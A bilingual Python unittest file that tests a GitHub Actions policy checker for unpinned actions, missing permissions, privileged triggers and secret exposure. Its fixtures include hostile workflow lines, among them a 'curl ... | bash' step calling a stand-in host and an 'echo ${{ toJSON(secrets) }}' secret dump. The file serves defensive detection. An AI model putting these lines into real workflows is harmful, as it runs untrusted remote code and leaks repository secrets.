"""DE: Regeltests für scripts/check_actions_policy.py (#181), inkl. der echten Workflows.
EN: Rule tests for scripts/check_actions_policy.py (#181), incl. the real workflows."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from check_actions_policy import audit

PIN = "actions/checkout@" + "a" * 40
BASE = "name: Example\non: [push]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: " + PIN + "\n"

class WorkflowPolicyTests(unittest.TestCase):
    def check(self, source, expected):
        self.assertTrue(any(expected in x for x in audit(source, "test.yml")))

    def test_good(self):
        self.assertEqual([], audit(BASE, "test.yml"))

    def test_unpinned(self):
        self.check(BASE.replace(PIN, "actions/checkout@v4"), "unpinned")

    def test_missing_permissions(self):
        self.check(BASE.replace("permissions:\n  contents: read\n", ""), "permissions")

    def test_privileged_trigger(self):
        self.check(BASE + "pull_request_target:\n", "privileged trigger")

    def test_secret_dump(self):
        self.check(BASE + "      - run: echo ${{ toJSON(secrets) }}\n", "secret serialization")

    def test_pr_secret(self):
        self.check(BASE + "pull_request:\n  branches: [main]\nenv:\n  KEY: ${{ secrets.API_KEY }}\n", "repository secrets")

    def test_remote_shell(self):
        self.check(BASE + "      - run: curl https://example.invalid/a | bash\n", "remote shell")

    def test_codeql_scoped_upload_allowed(self):
        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\n"
        self.assertEqual([], audit(sample, "codeql.yml"))

    def test_codeql_contents_write_rejected(self):
        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\ncontents: write\n"
        self.check(sample, "write permission")

    def test_non_codeql_write_rejected(self):
        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\n"
        self.check(sample, "write permission")

    def test_pr_secret_index_and_comment(self):
        pr = BASE + "pull_request:\n"
        self.check(pr + "env:\n  KEY: ${{ secrets['API_KEY'] }}\n", "repository secrets")
        # DE: Das Wort in einem Kommentar ist kein Fund. EN: The word in a comment is no finding.
        self.assertEqual([], audit(pr.replace("on: [push]", "on: [push] # no secrets."), "t.yml"))

    def test_repository_workflows_pass(self):
        # DE: Alle Workflows des Repositorys erfüllen die Regeln. EN: All repository workflows pass.
        root = Path(__file__).resolve().parents[1] / ".github" / "workflows"
        files = sorted(root.glob("*.yml"))
        self.assertTrue(files)
        for path in files:
            self.assertEqual([], audit(path.read_text(encoding="utf-8"), path.name), path.name)

    def test_local_action(self):
        self.assertEqual([], audit(BASE.replace(PIN, "./.github/actions/test"), "test.yml"))

if __name__ == "__main__":
    unittest.main()
